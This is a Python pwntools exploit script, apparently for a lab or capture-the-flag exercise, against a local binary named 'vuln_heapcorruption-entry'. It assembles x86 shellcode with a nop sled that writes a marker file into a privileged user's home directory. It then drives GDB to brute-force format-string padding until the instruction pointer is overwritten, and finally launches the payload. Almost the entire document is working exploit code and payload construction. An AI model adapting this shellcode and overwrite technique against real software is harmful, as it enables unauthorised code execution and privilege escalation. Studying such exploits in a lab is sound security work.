from pwn import *
from pygdbmi.gdbcontroller import GdbController
exe = context.binary = ELF('vuln_heapcorruption-entry')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


# stack-based shellcode that locates a string parameter and writes it to a file
#
target_file = "/home/privileged/heap-entry"
string_param = "success"

shellcode = "\t/* nop sled */ \n" + "\tnop\n"*100 + "\n"
shellcode += "\t/* adjust %esp */ \n" + "\tsub esp, 100\n"*10 + "\n"
shellcode += '\tjmp get_str\n'
shellcode += 'pop_str: \n\tpop esi\n'
shellcode += shellcraft.open(target_file, constants.O_CREAT |
                             constants.O_RDWR, constants.S_IRWXU)
shellcode += '\tpush eax  /* store fd */\n'
shellcode += shellcraft.write(fd='eax', buf="esi", n=len(string_param))
shellcode += '\tpop ebx /* retrieve fd */\n'
shellcode += shellcraft.exit()
shellcode += '\nget_str: \n\tcall pop_str\n'
shellcode += '\t.asciz "' + string_param + '"\n\n'

log.info("Crafted the following shellcode: \n%s" % shellcode)

encoded = asm(shellcode)
log.info("Disassembled shellcode: \n %s\n" % disasm(encoded))

# Test shellcode
#
p = log.progress("Test running shellcode ...")
q = run_shellcode(encoded)
q.wait_for_close()
q.poll()

if os.path.isfile(target_file):
    p.success("Successful!")
    os.unlink(target_file)
else:
    p.failure("Shellcode failed.")

# Testing crashes to get the fp overriden
sigsevd = False
padding = 21
eip = ""
p = log.progress(
    "Finding correct format string padding for heap corruption...")
while(eip != '0x42424242'):
    sigsevd = False
    postfix_payload = f"%{padding}cBBBB"
    #log.info(f"Testing additional payload: {postfix_payload}")
    gdbmi = GdbController()
    gdbmi.write("-file-exec-file " + exe.path)
    arg = flat(encoded[:-1]) + postfix_payload.encode()
    with open("poc", "wb") as f:
        f.write(arg)
    p.status(f"Running with payload\n{hexdump(arg)}")
    gdbmi.write("-exec-arguments $(cat poc)")
    resp = gdbmi.write("run")
    if resp[-1]['payload'].get('signal-name', "") == 'SIGSEGV':
        sigsevd = True
        eip = resp[-1]['payload']['frame']['addr']
        p.status(f"Sigsevd with eip {eip}")
        if eip == "0x42424242":
            break
        if "20" in eip:
            p.status(f"20 found, lowering by 1: {padding}")
            padding -= 1
        elif "42" in eip:
            p.status(f"42 found, lowering by 1: {padding}")
            padding -= 1
        else:
            p.status(f"no 20 found, increasing by 1: {padding}")
            padding += 1
    else:
        p.status(f"no sigseg, increasing by 10: {padding}")
        padding += 10

p.success(f"Padding {padding} works to crash with eip {eip}")

log.info("Reading address of argv[1]")
gdbmi = GdbController()
arg = flat(encoded[:-1]) + postfix_payload.encode()
with open("poc", "wb") as f:
    f.write(arg)
gdbmi.write("file " + exe.path)
gdbmi.write("break *main")
gdbmi.write("run $(cat poc)")
resp = gdbmi.write("p argv[1]")

target_addr = p32(int(resp[1]["payload"].split(" ")[2], 16) + 0x20)
padding = f"%{padding}c"

# Send exploit payload to process
#

payload = flat(encoded[:-1], padding, target_addr)
with open("poc", "wb") as f:
    f.write(payload)
log.info("Exploit payload: \n%s" % hexdump(payload))
log.info("Target file is %s" % target_file)
io = start([payload])

io.wait_for_close(timeout=100000)
